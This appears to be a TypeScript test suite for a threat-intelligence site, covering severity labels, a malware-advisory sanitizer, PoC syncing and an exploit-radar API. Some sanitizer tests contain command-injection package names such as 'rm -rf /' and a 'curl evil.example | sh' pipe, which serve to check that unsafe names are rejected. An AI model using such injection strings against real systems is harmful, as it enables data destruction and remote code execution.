/**
 * PHASE 8B — INSTITUTIONAL POLISH + LIVE EXPLOITS RADAR GATE.
 *
 * Pure local coverage (no network, no D1, no live endpoint) for:
 *   · the honest OG severity/priority policy and the rendered PNG contract;
 *   · the OSV narrative sanitizer, package-token safety and command injection;
 *   · the shared enum humanizer;
 *   · Telegram malware slot routing (fresh MAL-*, never legacy mir_*);
 *   · PoC-in-GitHub quiet-hours isolation and its subrequest ceiling;
 *   · the 4-tier `/api/v1/exploits` classification, filtering and pagination;
 *   · freshness-first advisories and the exploits sitemap entry.
 */
import { describe, expect, test } from 'bun:test';
import fs from 'node:fs';
import path from 'node:path';

import {
  computeOgPriority,
  formatKevCell,
  formatPocCell,
  formatStoredState,
  hexToRgb,
  ogSeverityBand,
} from '../../apps/web/app/lib/ogCardPolicy';
import { OG_CARD_HEIGHT, OG_CARD_WIDTH, renderOgCardPng } from '../../apps/web/app/lib/ogCard';
import { humanizeEnum, kevComplianceStatus } from '../../apps/web/app/lib/displayLabels';
import { isFreshAdvisory, ADVISORY_FRESH_WINDOW_DAYS } from '../../apps/web/app/lib/advisoryFreshness';
import {
  buildSupplyChainDossier,
  formatOsvNarrative,
  remediationFor,
  safePackageToken,
} from '../../workers/api/src/supplyChainDossier';
import { TELEGRAM_MALWARE_SELECTION_SQL } from '../../workers/ingest/src/telegramDispatch';
import { formatMalwareTelegramDispatch } from '../../packages/intelligence/src/syndication/telegramFormatter';
import {
  POC_MAX_FILES,
  POC_MAX_SUBREQUESTS,
  POC_QUIET_SLOT_HOURS,
  isPocSyncSlot,
  newestPocFileNames,
  runPocSync,
} from '../../workers/ingest/src/pocSync';
import { TELEGRAM_WIRE_SLOTS } from '../../workers/ingest/src/telegramSlots';
import {
  EXPLOIT_RADAR_SQL,
  buildExploitRadar,
  classifyExploitRow,
} from '../../workers/api/src/exploits';
import { staticSitemapEntries, buildUrlset } from '../../apps/web/app/lib/sitemap';
import { requiredTrust } from '../../workers/api/src/security';

const root = path.join(import.meta.dir, '..', '..');
const SHA = 'a'.repeat(64);

/* ───────────────────────── OG severity / priority ───────────────────────── */

describe('Phase 8B — OG card honesty', () => {
  test('CVSS 4.7 is MEDIUM and never CRITICAL', () => {
    const band = ogSeverityBand({ cvss: 4.7 });
    expect(band.key).toBe('medium');
    expect(band.label).toBe('MEDIUM SEVERITY ADVISORY');
    expect(band.accentHex).toBe('#EAB308');
    expect(band.label).not.toContain('CRITICAL');
  });

  test('CISA KEV forces CRITICAL regardless of CVSS', () => {
    expect(ogSeverityBand({ cvss: 4.7, kev: true }).key).toBe('critical');
    expect(ogSeverityBand({ cvss: null, kev: true }).accentHex).toBe('#FF4D00');
  });

  test('CVSS bands map to the institutional accents', () => {
    expect(ogSeverityBand({ cvss: 9.8 }).key).toBe('critical');
    expect(ogSeverityBand({ cvss: 8 }).key).toBe('high');
    expect(ogSeverityBand({ cvss: 7 }).accentHex).toBe('#F97316');
    expect(ogSeverityBand({ cvss: 3.9 }).key).toBe('low');
    expect(ogSeverityBand({ cvss: null }).accentHex).toBe('#94A3B8');
  });

  test('computed priority is deterministic and never UNBRIEFED', () => {
    expect(computeOgPriority({ kev: true, cvss: 3.1 })).toBe('P0 · KEV');
    expect(computeOgPriority({ kev: false, cvss: 9.1 })).toBe('P1 · HIGH');
    expect(computeOgPriority({ kev: false, cvss: 4.7, pocCount: 2, epss: 0.2 })).toBe('P1 · HIGH');
    expect(computeOgPriority({ kev: false, cvss: 7.2 })).toBe('P2 · MEDIUM');
    expect(computeOgPriority({ kev: false, cvss: 4.7 })).toBe('P3 · MONITOR');
    for (const input of [{}, { cvss: 4.7 }, { kev: true }]) {
      expect(computeOgPriority(input)).not.toContain('UNBRIEFED');
    }
  });

  test('KEV, PoC and provenance cells use clean institutional labels', () => {
    expect(formatKevCell('LISTED')).toBe('LISTED · KEV');
    expect(formatKevCell('LISTED_IN_KEV')).toBe('LISTED · KEV');
    expect(formatKevCell('NOT_LISTED')).toBe('NOT LISTED');
    expect(formatKevCell(null)).toBe('NOT LISTED');
    expect(formatKevCell('NOT_LISTED')).not.toContain('_');
    expect(formatPocCell(3)).toBe('PUBLIC POC · 3 REPOS');
    expect(formatPocCell(1)).toBe('PUBLIC POC · 1 REPO');
    expect(formatPocCell(0)).toBe('NONE TRACKED');
    expect(formatStoredState('AUTHORITATIVE_VERIFIED')).toBe('VERIFIED');
    expect(formatStoredState('NOT_LISTED')).toBe('NOT LISTED');
    expect(hexToRgb('#EAB308')).toEqual([234, 179, 8]);
  });

  test('rendered PNG is a genuine 1200×630 image, not a placeholder', async () => {
    const png = await renderOgCardPng({
      badge: 'MEDIUM SEVERITY ADVISORY',
      accentHex: '#EAB308',
      title: 'CVE-2026-129830',
      subtitle: 'Example / Product',
      cells: [
        { label: 'PRIORITY', value: 'P3 · MONITOR' },
        { label: 'CVSS', value: '4.7' },
        { label: 'EPSS', value: '0.1%' },
        { label: 'CISA KEV', value: 'NOT LISTED' },
        { label: 'EXPLOIT / POC', value: 'NONE TRACKED' },
      ],
    });
    expect(png.length).toBeGreaterThan(1000);
    expect([...png.slice(0, 8)]).toEqual([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
    const width = (png[16] << 24) | (png[17] << 16) | (png[18] << 8) | png[19];
    const height = (png[20] << 24) | (png[21] << 16) | (png[22] << 8) | png[23];
    expect(width).toBe(OG_CARD_WIDTH);
    expect(height).toBe(OG_CARD_HEIGHT);
  });
});

/* ───────────────────────────── OSV sanitizer ────────────────────────────── */

describe('Phase 8B — supply-chain dossier sanitizer', () => {
  const boilerplate =
    '--- _= Per source details. Do not edit below this line.=_ ## Source: kam193 (165c4572a1b) --- Category: PROBABLY_PENTEST';

  test('strips exporter boilerplate, headings and commit hashes', () => {
    const out = formatOsvNarrative(boilerplate);
    expect(out.narrative).not.toContain('Per source details');
    expect(out.narrative).not.toContain('##');
    expect(out.narrative).not.toContain('---');
    expect(out.narrative).not.toContain('165c4572a1b');
    expect(out.source).toBe('kam193');
    expect(out.category).toBe('Probably Pentest');
  });

  test('strips the real OSV `_-= ... =- _` marker without eating the narrative', () => {
    const out = formatOsvNarrative(
      '_-= Per source details. Do not edit below this line.=-_ Installing the package exfiltrates host data. Campaign: GENERIC-standard-pypi-install-pentest',
    );
    expect(out.narrative).not.toContain('Per source details');
    expect(out.narrative).not.toContain('_-=');
    expect(out.narrative).toContain('Installing the package exfiltrates host data.');
  });

  test('keeps the advisory narrative that precedes the boilerplate', () => {
    const out = formatOsvNarrative(
      'This package exfiltrates environment variables during install.\n\n' + boilerplate,
    );
    expect(out.narrative).toContain('exfiltrates environment variables');
    expect(out.narrative).not.toContain('Per source details');
  });

  test('only strict ecosystem-safe package tokens are interpolated', () => {
    expect(safePackageToken('bloomcredit-python')).toBe('bloomcredit-python');
    expect(safePackageToken('@scope/pkg')).toBe('@scope/pkg');
    expect(safePackageToken('evil pkg; rm -rf /')).toBeNull();
    expect(safePackageToken('pkg$(whoami)')).toBeNull();
    expect(safePackageToken('')).toBeNull();
  });

  test('remediation injects the real package and never `<package>`', () => {
    const pypi = remediationFor('PyPI', 'bloomcredit-python');
    expect(pypi[0]).toContain('pip uninstall -y bloomcredit-python');
    const npm = remediationFor('npm', 'bloomcredit-js');
    expect(npm.join(' ')).toContain('npm uninstall bloomcredit-js');
    const gem = remediationFor('RubyGems', 'evil-gem');
    expect(gem[0]).toContain('gem uninstall evil-gem');
    for (const steps of [pypi, npm, gem, remediationFor('PyPI', null)]) {
      expect(steps.join(' ')).not.toContain('<package>');
      expect(steps.join(' ')).not.toContain('<actual-pkg>');
    }
  });

  test('a full MAL dossier renders clean text and a classified source row', () => {
    const dossier = buildSupplyChainDossier({
      id: 'MAL-2026-20650',
      title: 'Malicious code in bloomcredit-python (PyPI)',
      family: null,
      summary: 'Malicious release of bloomcredit-python.',
      severity: 'HIGH',
      sha256: null,
      published_at: '2026-11-20T00:00:00Z',
      report_json: JSON.stringify({
        details: 'Steals CI tokens at import time.\n' + boilerplate,
        packages: ['bloomcredit-python'],
        affected_versions: [{ introduced: '0', fixed: '1.2.1' }],
        references: [{ url: 'https://osv.dev/vulnerability/MAL-2026-20650' }],
      }),
    });
    expect(dossier).not.toBeNull();
    expect(dossier!.package_name).toBe('bloomcredit-python');
    expect(dossier!.summary).not.toContain('Per source details');
    expect(dossier!.details).not.toContain('## Source:');
    expect(dossier!.details).not.toContain('165c4572a1b');
    expect(dossier!.remediation[0]).toContain('pip uninstall -y bloomcredit-python');
    expect(dossier!.source_classification.source).toBe('kam193');
    expect(dossier!.source_classification.category).toBe('Probably Pentest');
    expect(JSON.stringify(dossier)).not.toContain('<package>');
  });

  test('an unsafe package name is dropped rather than injected into a command', () => {
    const dossier = buildSupplyChainDossier({
      id: 'MAL-2026-99999',
      title: null,
      family: null,
      summary: null,
      severity: null,
      sha256: null,
      published_at: null,
      report_json: JSON.stringify({ package_name: 'pkg; curl evil.example | sh' }),
    });
    expect(dossier!.package_name).toBeNull();
    expect(dossier!.remediation.join(' ')).not.toContain('curl evil.example');
  });
});

/* ───────────────────────────── enum labels ──────────────────────────────── */

describe('Phase 8B — UI enum display', () => {
  test('storage enums render as English', () => {
    expect(humanizeEnum('AUTHORITATIVE_VERIFIED')).toBe('Authoritative Verified');
    expect(humanizeEnum('NOT_LISTED')).toBe('Not Listed');
    expect(humanizeEnum('NOT_ESTABLISHED')).toBe('Not Established');
    expect(humanizeEnum('NOT_LISTED_IN_KEV')).toBe('Not Listed In KEV');
    expect(humanizeEnum(null)).toBeNull();
    expect(humanizeEnum('')).toBeNull();
  });

  test('CISA BOD 22-01 status reports overdue and remaining days honestly', () => {
    const now = new Date('2026-11-26T00:00:00Z');
    expect(kevComplianceStatus('2026-12-06', now)?.label).toBe('10 DAYS REMAINING');
    const overdue = kevComplianceStatus('2026-11-20', now);
    expect(overdue?.overdue).toBe(true);
    expect(overdue?.label).toBe('OVERDUE BY 6 DAYS');
    expect(kevComplianceStatus(null)).toBeNull();
    expect(kevComplianceStatus('not-a-date')).toBeNull();
  });
});

/* ─────────────────────── Telegram malware routing ───────────────────────── */

describe('Phase 8B — Telegram malware slot routing', () => {
  test('selection prefers fresh MAL-2026 advisories', () => {
    expect(TELEGRAM_MALWARE_SELECTION_SQL).toContain("id LIKE 'MAL-%'");
    expect(TELEGRAM_MALWARE_SELECTION_SQL).toContain("id LIKE 'MAL-2026-%'");
    // Fresh 2026 rows sort ahead of older MAL years.
    expect(TELEGRAM_MALWARE_SELECTION_SQL.indexOf('MAL-2026')).toBeLessThan(
      TELEGRAM_MALWARE_SELECTION_SQL.indexOf('COALESCE(published_at'),
    );
  });

  test('legacy `mir_*` archive rows are excluded unconditionally', () => {
    expect(TELEGRAM_MALWARE_SELECTION_SQL).toContain("substr(lower(id), 1, 4) <> 'mir_'");
  });

  test('a MAL advisory links to its supply-chain dossier, not the artifact page', () => {
    const payload = formatMalwareTelegramDispatch({
      report_id: 'MAL-2026-20650',
      sha256: SHA,
      family: 'bloomcredit-python',
      severity: 'HIGH',
      format_class: 'PyPI package',
      capability_candidates: 2,
      primary_network_indicators: 1,
      brief: { executive_bluf: 'Malicious package release observed. Exfiltrates CI tokens.' },
    });
    expect(payload.url).toBe('https://zayron-x.co/intelligence/malware/advisories/MAL-2026-20650');
    expect(payload.html).toContain('/intelligence/malware/advisories/MAL-2026-20650');
    expect(payload.html).not.toContain('/malware/intelligence/reports/MAL-');
  });

  test('a static-analysis specimen keeps the artifact page', () => {
    const payload = formatMalwareTelegramDispatch({
      report_id: 'rep_abc123',
      sha256: SHA,
      family: 'AgentTesla',
      severity: 'HIGH',
      format_class: 'PE',
      capability_candidates: 3,
      primary_network_indicators: 2,
      brief: { executive_bluf: 'Credential stealer observed statically.' },
    });
    expect(payload.url).toBe('https://zayron-x.co/malware/intelligence/reports/rep_abc123');
  });
});

/* ───────────────────── PoC sync slot isolation/budget ───────────────────── */

describe('Phase 8B — PoC-in-GitHub quiet-hours expansion', () => {
  const at = (hour: number, minute: number) => new Date(Date.UTC(2026, 10, 26, hour, minute, 0));

  test('runs only at 02:40, 04:40 and 06:40 UTC', () => {
    expect([...POC_QUIET_SLOT_HOURS]).toEqual([2, 4, 6]);
    for (const hour of [2, 4, 6]) expect(isPocSyncSlot(at(hour, 40))).toBe(true);
    for (const hour of [0, 1, 3, 5, 8, 9, 17, 20]) expect(isPocSyncSlot(at(hour, 40))).toBe(false);
    expect(isPocSyncSlot(at(2, 20))).toBe(false);
    expect(isPocSyncSlot(at(2, 0))).toBe(false);
  });

  test('no quiet slot collides with a Telegram dispatch slot', () => {
    for (const hour of POC_QUIET_SLOT_HOURS) {
      const minuteOfDay = hour * 60 + 40;
      expect(TELEGRAM_WIRE_SLOTS.some((slot) => slot.minuteOfDay === minuteOfDay)).toBe(false);
      expect(TELEGRAM_WIRE_SLOTS.some((slot) => slot.minuteOfDay === hour * 60 + 20)).toBe(false);
    }
  });

  test('budget is six subrequests and five CVE index files', () => {
    expect(POC_MAX_SUBREQUESTS).toBe(6);
    expect(POC_MAX_FILES).toBe(5);
    expect(POC_MAX_SUBREQUESTS).toBeLessThanOrEqual(6);
  });

  test('newest listing selects the five highest 2026 CVE numbers', () => {
    const listing = [1101, 9999, 5500, 2200, 7700, 3300, 8800].map((n) => ({ name: `CVE-2026-${n}.json` }));
    expect(newestPocFileNames(listing)).toEqual([
      'CVE-2026-9999',
      'CVE-2026-8800',
      'CVE-2026-7700',
      'CVE-2026-5500',
      'CVE-2026-3300',
    ]);
  });

  test('a forced pass ingests 15–25 PoCs within six subrequests', async () => {
    const files = [7000, 6000, 5000, 4000, 3000].map((n) => ({ name: `CVE-2026-${n}.json` }));
    const written: string[] = [];
    const fetchFn = (async (url: string) => {
      if (url.includes('/contents/')) return { ok: true, json: async () => files } as Response;
      const cve = /(CVE-\d{4}-\d+)\.json/.exec(url)?.[1] ?? 'CVE-2026-1000';
      return {
        ok: true,
        json: async () => [1, 2, 3, 4].map((i) => ({
          full_name: `owner-${i}/${cve}`,
          html_url: `https://github.com/owner-${i}/${cve}`,
          stargazers_count: i,
          description: 'proof of concept',
          created_at: '2026-11-01T00:00:00Z',
        })),
      } as Response;
    }) as unknown as typeof fetch;

    const db = {
      prepare: () => ({
        bind: (...args: unknown[]) => ({
          run: async () => {
            written.push(String(args[1]));
          },
        }),
      }),
    };

    const summary = await runPocSync(
      { DB: db, POC_SYNC_ENABLED: 'true' },
      { fetchFn, when: at(4, 40), force: true },
    );
    expect(summary.status).toBe('OK');
    expect(summary.subrequestsUsed).toBe(6);
    expect(summary.subrequestsUsed).toBeLessThanOrEqual(POC_MAX_SUBREQUESTS);
    expect(summary.files_read).toBe(5);
    expect(summary.pocs_written).toBeGreaterThanOrEqual(15);
    expect(summary.pocs_written).toBeLessThanOrEqual(25);
    expect(written.length).toBe(summary.pocs_written);
  });
});

/* ─────────────────────────── Exploit radar ─────────────────────────────── */

describe('Phase 8B — /api/v1/exploits 4-tier classification', () => {
  const base = { cve_id: 'CVE-2026-135713', vendor: 'Acme', product: 'Gateway' };

  test('KEV membership is the strongest tier', () => {
    const item = classifyExploitRow({
      ...base,
      is_exploited_in_wild: 1,
      kev_due_date: '2026-12-01',
      cvss_score: 9.8,
      epss_score: 0.4,
      poc_count: 2,
      poc_repo: 'owner/repo',
      poc_url: 'https://github.com/owner/repo',
      poc_stars: 120,
      detection_sources: 'nuclei,sigma',
    });
    expect(item?.tier).toBe('ACTIVE_KEV');
    expect(item?.tiers).toEqual(['ACTIVE_KEV', 'PUBLIC_POC', 'WEAPONIZED_DETECTION', 'IMMINENT_EPSS']);
    expect(item?.kev).toEqual({ listed: true, due_date: '2026-12-01' });
    expect(item?.detection).toEqual({ nuclei: true, sigma: true, sources: ['nuclei', 'sigma'] });
  });

  test('public PoC rows keep repo, stars and only-github links', () => {
    const item = classifyExploitRow({
      ...base,
      poc_count: 3,
      poc_repo: 'owner/repo',
      poc_url: 'https://github.com/owner/repo',
      poc_stars: 42,
    });
    expect(item?.tier).toBe('PUBLIC_POC');
    expect(item?.poc).toEqual({
      count: 3,
      repo_full_name: 'owner/repo',
      html_url: 'https://github.com/owner/repo',
      stars: 42,
    });
  });

  test('a non-GitHub PoC URL is never exposed as a link', () => {
    const item = classifyExploitRow({
      ...base,
      poc_count: 1,
      poc_repo: 'owner/repo',
      poc_url: 'https://evil.example/poc',
    });
    expect(item?.poc.count).toBe(1);
    expect(item?.poc.html_url).toBeNull();
  });

  test('detection coverage alone is WEAPONIZED_DETECTION', () => {
    const item = classifyExploitRow({ ...base, detection_sources: 'sigma' });
    expect(item?.tier).toBe('WEAPONIZED_DETECTION');
    expect(item?.detection.sigma).toBe(true);
    expect(item?.detection.nuclei).toBe(false);
  });

  test('EPSS >= 10% or a positive 5-point velocity is IMMINENT_EPSS', () => {
    expect(classifyExploitRow({ ...base, epss_score: 0.1 })?.tier).toBe('IMMINENT_EPSS');
    expect(classifyExploitRow({ ...base, epss_score: 0.01, epss_delta: 0.05 })?.tiers).toContain('IMMINENT_EPSS');
    expect(classifyExploitRow({ ...base, epss_score: 0.09, epss_delta: 0.04 })).toBeNull();
  });

  test('a row with no stored exploit evidence is excluded', () => {
    expect(classifyExploitRow({ ...base, is_exploited_in_wild: 0, epss_score: 0.01 })).toBeNull();
    expect(classifyExploitRow({ cve_id: 'not-a-cve', is_exploited_in_wild: 1 })).toBeNull();
  });

  test('summary counts every tier across the whole radar, before pagination', () => {
    const payload = buildExploitRadar(
      [
        { ...base, cve_id: 'CVE-2026-100001', is_exploited_in_wild: 1 },
        { ...base, cve_id: 'CVE-2026-100002', poc_count: 1, poc_url: 'https://github.com/a/b' },
        { ...base, cve_id: 'CVE-2026-100003', detection_sources: 'nuclei' },
        { ...base, cve_id: 'CVE-2026-100004', epss_score: 0.2 },
      ],
      { limit: 2 },
      '2026-11-26T04:40:00Z',
    );
    expect(payload.summary).toEqual({
      total_tracked: 4,
      active_kev: 1,
      public_poc: 1,
      weaponized_detection: 1,
      imminent_epss: 1,
      last_poc_sync_at: '2026-11-26T04:40:00Z',
    });
    expect(payload.items).toHaveLength(2);
    expect(payload.meta).toMatchObject({ total: 4, limit: 2, offset: 0, tier: 'all' });
  });

  test('tier filters, search and pagination behave', () => {
    const rows = [
      { ...base, cve_id: 'CVE-2026-200001', vendor: 'Acme', is_exploited_in_wild: 1 },
      { ...base, cve_id: 'CVE-2026-200002', vendor: 'Globex', poc_count: 1 },
      { ...base, cve_id: 'CVE-2026-200003', vendor: 'Initech', detection_sources: 'sigma' },
    ];
    expect(buildExploitRadar(rows, { tier: 'kev' }).items.map((i) => i.cve_id)).toEqual(['CVE-2026-200001']);
    expect(buildExploitRadar(rows, { tier: 'poc' }).items.map((i) => i.cve_id)).toEqual(['CVE-2026-200002']);
    expect(buildExploitRadar(rows, { tier: 'weaponized' }).items.map((i) => i.cve_id)).toEqual(['CVE-2026-200003']);
    expect(buildExploitRadar(rows, { q: 'globex' }).items.map((i) => i.cve_id)).toEqual(['CVE-2026-200002']);
    const page = buildExploitRadar(rows, { limit: 1, offset: 1 });
    expect(page.items).toHaveLength(1);
    expect(page.meta).toMatchObject({ total: 3, limit: 1, offset: 1 });
    // An unknown tier falls back to `all` rather than erroring.
    expect(buildExploitRadar(rows, { tier: 'bogus' }).meta.tier).toBe('all');
  });

  test('the endpoint is an anonymous public read (no operator credential)', () => {
    expect(requiredTrust('GET', '/api/v1/exploits')).toBe('public');
    expect(requiredTrust('POST', '/api/v1/exploits')).not.toBe('public');
  });

  test('the radar SQL reads only verified facts from the three live tables', () => {
    expect(EXPLOIT_RADAR_SQL).toContain("provenance_state = 'AUTHORITATIVE_VERIFIED'");
    expect(EXPLOIT_RADAR_SQL).toContain('cve_pocs');
    expect(EXPLOIT_RADAR_SQL).toContain('detection_rules');
    expect(EXPLOIT_RADAR_SQL).toContain('epss_score');
    expect(EXPLOIT_RADAR_SQL).toContain('0.1');
    expect(EXPLOIT_RADAR_SQL).not.toContain('INSERT');
    expect(EXPLOIT_RADAR_SQL).not.toContain('UPDATE');
  });
});

/* ─────────────────────── freshness and sitemap ─────────────────────────── */

describe('Phase 8B — freshness-first advisories and sitemap graduation', () => {
  test('freshness window is 30 days and relative to now', () => {
    const now = new Date('2026-11-26T00:00:00Z');
    expect(ADVISORY_FRESH_WINDOW_DAYS).toBe(30);
    expect(isFreshAdvisory('2026-11-20T00:00:00Z', now)).toBe(true);
    expect(isFreshAdvisory('2026-10-27T00:00:00Z', now)).toBe(true);
    expect(isFreshAdvisory('2026-07-01T00:00:00Z', now)).toBe(false);
    expect(isFreshAdvisory(null, now)).toBe(false);
    expect(isFreshAdvisory('nope', now)).toBe(false);
  });

  test('/intelligence/exploits is declared high priority and daily', () => {
    const entries = staticSitemapEntries('https://zayron-x.co');
    const exploits = entries.find((entry) => entry.loc === 'https://zayron-x.co/intelligence/exploits');
    expect(exploits).toMatchObject({ priority: '0.9', changefreq: 'daily' });
    const xml = buildUrlset([exploits!]);
    expect(xml).toContain('<priority>0.9</priority>');
    expect(xml).toContain('<changefreq>daily</changefreq>');
  });

  test('the sidebar no longer labels Exploits STAGED', () => {
    const source = fs.readFileSync(path.join(root, 'apps/web/app/components/IntelligenceShellFrame.tsx'), 'utf-8');
    expect(source).not.toContain('routes.exploits.href,');
    expect(source).toContain('routes.actors.href');
    expect(source).toContain('routes.campaigns.href');
  });

  test('the exploits page is a real SSR surface and not the staged placeholder', () => {
    const page = fs.readFileSync(path.join(root, 'apps/web/app/intelligence/exploits/page.tsx'), 'utf-8');
    expect(page).toContain('getExploitRadar');
    expect(page).toContain('CollectionPage');
    expect(page).not.toContain('ExploitList');
    expect(page).toContain('resolvePageRobots');
    const config = fs.readFileSync(path.join(root, 'apps/web/next.config.ts'), 'utf-8');
    expect(config).toContain('/intelligence/exploits');
    expect(config).toContain('s-maxage=300');
  });
});
